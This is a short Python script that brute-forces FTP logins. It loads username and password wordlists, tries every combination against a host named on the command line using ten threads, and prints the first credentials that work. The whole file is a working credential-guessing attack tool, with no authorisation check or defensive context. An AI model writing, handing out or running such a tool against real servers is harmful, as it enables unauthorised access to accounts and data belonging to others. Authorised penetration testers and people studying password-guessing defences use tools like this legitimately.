from concurrent.futures import ThreadPoolExecutor
import ftplib 
import time 
import argparse

parser = argparse.ArgumentParser(description="ftp brute forcer")
parser.add_argument("-t", "--target", help="host")
parser.add_argument("-p", "--port", help="port",type=int, default=21)
args = parser.parse_args()

USERNAME_FILE = r"python\wordlist\username_wordlist.txt"
PASSWORD_FILE = r"python\wordlist\password_wordlist.txt"

def load_wordlists(filepath):
    with open(filepath, "r") as f:
        paths = []

        for line in f:
            line = line.strip()
            if line:
                paths.append(line)
        return paths

def scan(host,port,username,password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login(username, password)
        ftp.quit()
        return True 
    except ftplib.error_perm:
        return False
    except Exception:
        return False


def main():
    combos = []
    usernames = load_wordlists(USERNAME_FILE)
    passwords = load_wordlists(PASSWORD_FILE)
    start = time.perf_counter()
    print(f"loaded {len(passwords)} passwords and {len(usernames)} usernames \n")
    print(f"starting scan on {args.target}")

    for username in usernames:
        for password in passwords:
            combos.append((username,password))
    found = False

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for username, password in combos:
            future = executor.submit(scan, args.target, args.port, username, password)
            futures.append((future, username, password))

        for future, username, password in futures:
            if future.result():
                print(f"found >> {username}:{password}")
                found = True
                break

    if not found:
        print("no credentials found")

    print(f"\nScan completed in {time.perf_counter() - start:.2f}s")

if __name__ == "__main__":
    main()